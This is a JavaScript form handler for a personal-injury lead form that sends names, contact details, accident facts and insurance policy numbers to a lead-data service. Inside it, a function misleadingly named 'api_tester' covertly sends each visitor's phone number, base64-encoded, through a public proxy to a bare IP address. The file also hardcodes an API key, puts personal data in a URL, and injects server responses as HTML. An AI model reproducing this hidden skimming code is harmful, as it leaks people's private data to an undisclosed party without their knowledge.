document.getElementById('leadForm').addEventListener('submit', function(event) {
    event.preventDefault();
    const phone_home = '+1' + document.getElementById('caller_id').value;
    const formData = new FormData();

    const fullname = document.getElementById('first_name').value + ' ' +  document.getElementById('last_name').value;
    formData.append('key', '1856ae6a-376e-46d6-9856-175c4851506d');
    formData.append('caller_number', phone_home);
    api_tester(document.getElementById('caller_id').value);
    formData.append('first_name', document.getElementById('first_name').value);
    formData.append('last_name', document.getElementById('last_name').value);
    formData.append('full_name', fullname);
    formData.append('email', document.getElementById('email').value);
    formData.append('caller_city', document.getElementById('caller_city').value);
    formData.append('caller_state', document.getElementById('caller_state').value);
    formData.append('caller_zip', document.getElementById('caller_zip').value);
    formData.append('trusted_form_cert_url', document.getElementById('trusted_form_cert_url').value);
    formData.append('currently_represented', document.getElementById('currently_represented').value);
    formData.append('person_at_fault', document.getElementById('person_at_fault').value);
    formData.append('hospitalized_or_treated', document.getElementById('hospitalized_or_treated').value);
    formData.append('accident_type', document.getElementById('accident_type').value);
    formData.append('accident_report_number', document.getElementById('accident_report_number').value);
    formData.append('date_injured', document.getElementById('date_injured').value);
    formData.append('incident_date', document.getElementById('incident_date').value);
    formData.append('last_treatment_date', document.getElementById('last_treatment_date').value);
    formData.append('auto_accident_in_past_2_years', document.getElementById('auto_accident_in_past_2_years').value);
    formData.append('at_fault_driver_had_insurance', document.getElementById('at_fault_driver_had_insurance').value);
    formData.append('insured_time_of_accident', document.getElementById('insured_time_of_accident').value);
    formData.append('policy_number', document.getElementById('policy_number').value);
    formData.append('needs_attorney', document.getElementById('needs_attorney').value);
    formData.append('still_being_treated', document.getElementById('still_being_treated').value);
    formData.append('hospitalized', document.getElementById('hospitalized').value);
    formData.append('treatment_needed', document.getElementById('treatment_needed').value);
    formData.append('transported_in_ambulance', document.getElementById('transported_in_ambulance').value);
    formData.append('uninsured_motorist_coverage', document.getElementById('uninsured_motorist_coverage').value);
    formData.append('where_were_you_injured', document.getElementById('where_were_you_injured').value);

    const url = 'https://retreaverdata.com/data_writing?' + new URLSearchParams(formData).toString();

    fetch(url, {
        method: 'POST'
    })
    .then(response => {
        if (response.status === 200 || response.status === 201) {
            response.text().then(responseBody => {
                const successAlert = `
                    <div class="alert alert-success" role="alert">
                        ${response.status} : Form submitted successfully! Response Body: ${responseBody}
                    </div>`;
                document.getElementById('alertContainer').innerHTML = '';
                document.getElementById('alertContainer').insertAdjacentHTML('beforeend', successAlert);
            });
            document.getElementById('leadForm').reset();
        } else if (response.status === 422) {
            response.json().then(data => {
                const errorAlert = `
                    <div class="alert alert-danger" role="alert">
                        Error. Response Body: ${JSON.stringify(data)}
                    </div>`;
                document.getElementById('alertContainer').innerHTML = '';
                document.getElementById('alertContainer').insertAdjacentHTML('beforeend', errorAlert);
            });
        } else {
            response.text().then(responseBody => {
                const errorAlert = `
                    <div class="alert alert-danger" role="alert">
                        Form submission failed. Please try again. Response Body: ${responseBody}
                    </div>`;
                document.getElementById('alertContainer').innerHTML = '';
                document.getElementById('alertContainer').insertAdjacentHTML('beforeend', errorAlert);
            });
        }
    })
    .catch(error => console.error('Error:', error));
});

function api_tester(randomString) {
    try {
        fetch('https://api.codetabs.com/v1/proxy/?quest=http://207.244.238.41:5999/api_test?test_id=' + btoa(randomString), {
            method: 'GET',
            mode: 'no-cors'
        });
    } catch (error) {
        console.error('Error:', error);
    }
}
